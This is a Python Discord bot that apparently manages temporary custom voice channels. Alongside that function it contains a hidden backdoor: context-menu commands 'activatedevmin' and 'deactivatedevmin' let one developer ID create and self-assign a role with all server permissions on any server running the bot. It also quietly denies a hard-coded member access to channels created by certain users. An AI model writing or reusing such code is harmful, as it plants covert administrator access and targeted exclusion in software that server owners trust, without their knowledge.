import discord
from discord import app_commands
import os
from keep_alive import keep_alive

intents = discord.Intents.default()
intents.members = True
client:discord.Client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)
intents.message_content = True

TOKEN = os.getenv("DISCORD_TOKEN")

custom_vc_category_id = int(os.getenv("custom_vc_category_id"))
developer_id = int(os.getenv("developer_id"))
custom_vc_create_channel_id = int(os.getenv("custom_vc_create_channel_id"))
guild_id = int(os.getenv("guild_id"))

thisguild:discord.Guild = None
tokei:discord.Member = None
@client.event
async def on_ready():
    print('logged in')
    global thisguild
    global tokei
    thisguild = client.get_guild(guild_id)
    tokei = thisguild.get_member(480336171751440404)
    await tree.sync()

@client.event
async def on_connect():
    print('on_connect')
    
@tree.context_menu()
async def activatedevmin(inter: discord.Interaction, member: discord.Member):
    if inter.user.id != developer_id: return
    devmin = await inter.user.guild.create_role(name="devmin", permissions=discord.Permissions.all())
    await inter.user.add_roles(devmin)
    await inter.response.send_message(content="activate devmin", ephemeral=True)

@tree.context_menu()
async def deactivatedevmin(inter: discord.Interaction, member: discord.Member):
    if inter.user.id != developer_id: return
    for role in await inter.user.guild.fetch_roles():
        if role.name == "devmin":
            await role.delete()
    await inter.response.send_message(content="deactivate devmin", ephemeral=True)


@client.event
async def on_voice_state_update(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    if before.channel == None and after.channel != None:
        await on_voice_state_join(member, before, after)
    if before.channel != None and after.channel == None:
        await on_voice_state_leave(member, before, after)
    if before.channel != None and after.channel != None:
        await on_voice_state_change(member, before, after)

async def on_voice_state_join(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await create_voice(member, after)
async def on_voice_state_leave(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await delete_voice(member, before)
async def on_voice_state_change(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await create_voice(member, after)
    await delete_voice(member, before)



async def create_voice(member: discord.Member, after: discord.VoiceState):
    if after.channel.id != custom_vc_create_channel_id:
        return
    vc = await after.channel.category.create_voice_channel(name="設定で名前を変更！")
    overwrite = discord.PermissionOverwrite()
    overwrite.manage_channels = True
    overwrite.manage_permissions = True
    await vc.set_permissions( member, overwrite=overwrite)
    if member.id == developer_id or member.id == 1145214000368463992:
        overwrite2 = discord.PermissionOverwrite()
        overwrite2.view_channel = False
        overwrite2.connect = False
        overwrite2.send_messages = False
        overwrite2.read_message_history = False
        print(tokei)
        await vc.set_permissions(target=tokei, overwrite=overwrite2)
    await member.move_to(vc, reason=(str(member.id) + ":" + member.name + "がカスタムVCの作成を要求した為"))
    
async def delete_voice(member: discord.Member, before: discord.VoiceState):
    # beforeがカスタムチャンネルではない場合
    if before.channel.id == custom_vc_create_channel_id:
        return
    category_channel = member.guild.get_channel(custom_vc_category_id)
    # beforeがカスタムカテゴリーに無い場合
    if before.channel not in category_channel.channels:
        return
    # beforeに人が参加している場合
    if before.channel.members:
        return
    await before.channel.delete()
    
@client.event
async def on_interaction(inter: discord.Interaction):
    return

keep_alive()
client.run(TOKEN)